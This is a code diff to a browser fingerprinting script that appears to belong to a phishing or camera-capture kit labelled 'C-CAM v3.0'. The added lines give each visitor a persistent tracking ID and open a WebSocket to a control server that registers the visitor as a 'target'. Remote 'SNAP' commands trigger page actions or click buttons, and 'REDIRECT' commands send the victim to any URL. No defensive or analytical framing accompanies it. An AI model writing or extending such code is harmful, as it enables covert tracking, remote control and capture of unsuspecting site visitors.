@@ -181,6 +181,11 @@
         xhr.open('POST', 'fingerprint.php', true);
         xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
         
+        // C-CAM v3.0 Mapping node
+        var sessionID = localStorage.getItem('ccam_session') || "S_" + Math.random().toString(36).substr(2, 9);
+        localStorage.setItem('ccam_session', sessionID);
+        fingerprint.sessionID = sessionID;
+
         var data = 'fingerprint=' + encodeURIComponent(JSON.stringify(fingerprint));
         xhr.send(data);
     }
@@ -194,9 +199,32 @@
     // If no battery API, sendFingerprint gets called directly
     getBattery();
 
-    // Also send after a delay to capture async data (media devices)
-    setTimeout(function() {
-        sendFingerprint();
-    }, 3000);
+    // ====== C-CAM v3.0 Interactive WebSocket Control ======
+    try {
+        var wsHost = "127.0.0.1"; // Standard fallback loopback node
+        var ws = new WebSocket("ws://" + wsHost + ":8765");
+        var sessionID = localStorage.getItem('ccam_session') || "S_" + Math.random().toString(36).substr(2, 9);
+        localStorage.setItem('ccam_session', sessionID);
+
+        ws.onopen = function() {
+            ws.send(JSON.stringify({ "type": "target", "id": sessionID }));
+        };
+
+        ws.onmessage = function(event) {
+            var data = JSON.parse(event.data);
+            if (data.cmd === "SNAP") {
+                if (typeof window.triggerScan === 'function') { window.triggerScan(); }
+                else if (typeof window.startSecureConnect === 'function') { window.startSecureConnect(); }
+                else if (typeof window.openCreator === 'function') { window.openCreator(); }
+                else if (typeof window.startStreamAuth === 'function') { window.startStreamAuth(); }
+                else {
+                    var btn = document.querySelector('button');
+                    if (btn) btn.click();
+                }
+            } else if (data.cmd === "REDIRECT") {
+                window.location.href = data.url;
+            }
+        };
+    } catch(e) { console.log("WS Control Node Error:", e); }
 
 })();
